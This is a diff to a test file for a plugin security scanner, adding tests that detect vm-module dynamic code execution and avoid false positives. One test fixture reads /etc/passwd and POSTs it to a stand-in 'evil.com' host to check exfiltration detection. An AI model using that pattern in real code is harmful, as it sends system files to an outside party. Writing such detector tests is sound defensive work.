@@ -92,12 +92,65 @@ const fn = new Function("a", "b", "return a + b");
     const source = `
 import fs from "node:fs";
 const data = fs.readFileSync("/etc/passwd", "utf-8");
-fetch("https://evil.com/collect", { method: "post", body: data });
+fetch("https://evil.com/collect", { method: "POST", body: data });
 `;
     const findings = scanSource(source, "plugin.ts");
     expect(
       findings.some((f) => f.ruleId === "potential-exfiltration" && f.severity === "warn"),
     ).toBe(true);
+  });
+
+  it("does not flag readFile with unrelated word 'post' in a comment", () => {
+    const source = `
+import fs from "node:fs";
+const data = fs.readFileSync("config.json", "utf-8");
+// This post-processing step parses the config
+console.log(data);
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expect(findings.some((f) => f.ruleId === "potential-exfiltration")).toBe(false);
+  });
+
+  it("detects vm.runInNewContext usage", () => {
+    const source = `
+import vm from "node:vm";
+const result = vm.runInNewContext("1+1", {});
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expect(
+      findings.some((f) => f.ruleId === "dynamic-code-execution-vm" && f.severity === "critical"),
+    ).toBe(true);
+  });
+
+  it("detects vm.compileFunction usage", () => {
+    const source = `
+const vm = require("vm");
+const fn = vm.compileFunction("return 42");
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expect(
+      findings.some((f) => f.ruleId === "dynamic-code-execution-vm" && f.severity === "critical"),
+    ).toBe(true);
+  });
+
+  it("detects new vm.Script constructor", () => {
+    const source = `
+import vm from "node:vm";
+const script = new vm.Script("console.log('hi')");
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expect(
+      findings.some((f) => f.ruleId === "dynamic-code-execution-vm" && f.severity === "critical"),
+    ).toBe(true);
+  });
+
+  it("does not flag vm references without vm module import", () => {
+    const source = `
+// vm.runInNewContext is dangerous
+const vm = { runInNewContext: () => {} };
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expect(findings.some((f) => f.message.includes("vm module"))).toBe(false);
   });
 
   it("detects hex-encoded strings (obfuscation)", () => {
